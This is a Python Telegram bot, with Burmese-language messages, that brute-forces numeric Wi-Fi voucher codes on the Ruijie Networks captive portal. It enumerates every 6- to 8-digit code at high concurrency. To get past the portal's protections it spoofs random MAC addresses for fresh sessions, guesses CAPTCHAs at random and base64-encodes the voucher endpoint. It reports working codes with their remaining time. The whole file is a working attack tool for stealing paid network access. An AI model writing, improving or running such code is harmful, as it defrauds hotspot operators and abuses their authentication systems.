import os
import asyncio
import aiohttp
import random
import re
import time
import base64
import json
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ── CONFIG ──────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8537971974"))

BATCH_SIZE = 100
MAX_CONCURRENT = 50

# ── GLOBALS ──────────────────────────────────────────────────────────────
user_data = {}
scanning_active = False
found_codes = []
stop_scan = False
scan_task = None
session_url = None

# ── HELPERS ──────────────────────────────────────────────────────────────

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'text/html',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except:
        return prev_sid

async def captcha_image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image',
                                   params=params, headers=headers, timeout=5) as req:
            return await req.read()
    except:
        return None

async def captcha_text(image_bytes):
    # Simple random CAPTCHA solver (since no OCR)
    return ''.join(random.choice('0123456789') for _ in range(4))

async def verify_captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
               'content-type': 'application/json'}
    try:
        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
                                   headers=headers, json=json_data, timeout=5) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except:
        return None

async def get_balance_info(session_id):
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
    ]
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'application/json',
    }
    async with aiohttp.ClientSession() as temp_session:
        for url in endpoints:
            try:
                async with temp_session.get(url, headers=headers, timeout=8) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    if not data.get("success", False):
                        continue
                    result = data.get("result", {})
                    minutes = result.get("totalMinutes") or result.get("remainingMinutes") or 0
                    plan_name = result.get("profileName") or "Unknown"
                    if minutes > 0:
                        display = f"📋 {plan_name} | ⏱ {int(minutes)}m"
                        return (display, minutes, plan_name)
            except:
                continue
    return ("📋 Unknown | ⏱ N/A", 0, "Unknown")

async def perform_check(code, session_url, session_id_cache=None):
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()
    
    session_id = session_id_cache
    timeout = aiohttp.ClientTimeout(total=10, connect=3)
    
    try:
        async with aiohttp.ClientSession(
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            if not session_id:
                session_id = await get_session_id(task_session, session_url)
                if not session_id:
                    return None
            
            image = await captcha_image(task_session, session_id)
            if not image:
                return None
            text = await captcha_text(image)
            if not text:
                return None
            if not await verify_captcha(task_session, session_id, text):
                return None
            
            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": text,
            }
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
                "content-type": "application/json",
                "accept": "*/*",
            }
            
            try:
                async with task_session.post(post_url, json=data, headers=headers, timeout=8) as req:
                    response = await req.text()
                    if 'request limited' in response:
                        return None
                    if 'logonUrl' in response:
                        balance_display, balance_minutes, plan_name = await get_balance_info(session_id)
                        return {
                            "code": code,
                            "plan": plan_name,
                            "balance": balance_display,
                            "minutes": balance_minutes,
                            "session_id": session_id
                        }
                    elif 'STA' in response:
                        return {"code": code, "status": "limited"}
            except:
                return None
    except:
        return None
    return None

# ── GENERATORS ──────────────────────────────────────────────────────────

def iter_digit_codes(mode):
    length = int(mode)
    codes = [str(i).zfill(length) for i in range(10 ** length)]
    random.shuffle(codes)
    yield from codes

# ── BOT COMMANDS ──────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 Ruijie Scanner Bot (Render Edition)\n\n"
        "/setup <url> - Session URL ထည့်ရန်\n"
        "/scan <6|7|8> - Scan စတင်ရန်\n"
        "/stop - Scan ရပ်ရန်\n"
        "/saved - တွေ့ရှိထားသော codes များကြည့်ရန်\n"
        "/status - Bot အခြေအနေကြည့်ရန်"
    )

async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global session_url
    chat_id = update.effective_chat.id
    args = context.args
    if not args:
        await update.message.reply_text("❌ /setup <session_url> ကို သုံးပါ")
        return
    url = args[0]
    if "ruijienetworks.com" not in url:
        await update.message.reply_text("❌ Ruijie portal URL မဟုတ်ပါ")
        return
    session_url = url
    user_data[chat_id] = {"session_url": url}
    await update.message.reply_text("✅ Session URL သိမ်းဆည်းပြီး")

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global scanning_active, found_codes, stop_scan, scan_task, session_url
    chat_id = update.effective_chat.id
    if chat_id not in user_data:
        await update.message.reply_text("❌ /setup ဖြင့် URL ထည့်ပါ")
        return
    args = context.args
    if not args:
        await update.message.reply_text("❌ /scan <6|7|8> ကို သုံးပါ")
        return
    mode = args[0]
    if mode not in ["6", "7", "8"]:
        await update.message.reply_text("❌ 6, 7, 8 ကိုသာ သုံးပါ")
        return
    if scanning_active:
        await update.message.reply_text("⏳ Scan လုပ်နေပြီးသား")
        return
    
    scanning_active = True
    stop_scan = False
    found_codes = []
    session_url = user_data[chat_id]["session_url"]
    await update.message.reply_text(f"🚀 Scan စတင်ပြီ — Mode: {mode}-digit")
    
    scan_task = asyncio.create_task(run_scan(update, context, mode, session_url))

async def run_scan(update, context, mode, session_url):
    global scanning_active, found_codes, stop_scan
    chat_id = update.effective_chat.id
    
    try:
        code_iter = iter_digit_codes(mode)
        total = 10 ** int(mode)
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Error: {e}")
        scanning_active = False
        return
    
    checked = 0
    found = 0
    start_time = time.time()
    session_cache = None
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    
    progress_msg = await context.bot.send_message(chat_id, "🔍 Scan စတင်နေပါသည်...")
    
    async def _check(code):
        nonlocal session_cache
        async with sem:
            result = await perform_check(code, session_url, session_cache)
            if result and result.get("session_id"):
                session_cache = result.get("session_id")
            return result
    
    try:
        while True:
            if stop_scan or not scanning_active:
                await context.bot.send_message(chat_id, "⏹️ Scan ရပ်တန့်ပြီး")
                break
            
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            
            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    continue
                if result is None:
                    continue
                if result.get("status") == "limited":
                    continue
                elif result.get("code"):
                    found_codes.append(result)
                    found += 1
                    await context.bot.send_message(
                        chat_id,
                        f"✅ Found: {result['code']}\n{result.get('balance', 'N/A')}"
                    )
            
            checked += len(batch)
            
            elapsed = time.time() - start_time
            speed = int((checked / elapsed) * 60) if elapsed > 0 else 0
            progress = min(100, (checked / total) * 100)
            
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=(
                        f"🔍 Scanning...\n"
                        f"📦 Checked: {checked:,}/{total:,}\n"
                        f"📊 Progress: {progress:.1f}%\n"
                        f"⚡ Speed: {speed:,} codes/min\n"
                        f"✅ Found: {found}"
                    )
                )
            except:
                pass
            
            await asyncio.sleep(0.1)
    
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Error: {e}")
    finally:
        scanning_active = False
        await context.bot.send_message(
            chat_id,
            f"🏁 Scan ပြီးဆုံးပြီ — Found: {len(found_codes)} codes"
        )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global scanning_active, stop_scan
    scanning_active = False
    stop_scan = True
    await update.message.reply_text("⏹️ Scan ရပ်တန့်ရန် ကြိုးစားနေပါသည်...")

async def saved(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not found_codes:
        await update.message.reply_text("📭 တွေ့ရှိထားသော code မရှိပါ")
        return
    text = "✅ Found Codes:\n" + "\n".join([f"{c['code']} | {c.get('balance', 'N/A')}" for c in found_codes[-20:]])
    await update.message.reply_text(text)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📊 Bot Status\n\n"
        f"🔍 Scan Active: {scanning_active}\n"
        f"✅ Found Codes: {len(found_codes)}"
    )

# ── MAIN ──────────────────────────────────────────────────────────────────

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(CommandHandler("scan", scan))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("saved", saved))
    app.add_handler(CommandHandler("status", status))
    app.run_polling()

if __name__ == "__main__":
    main()
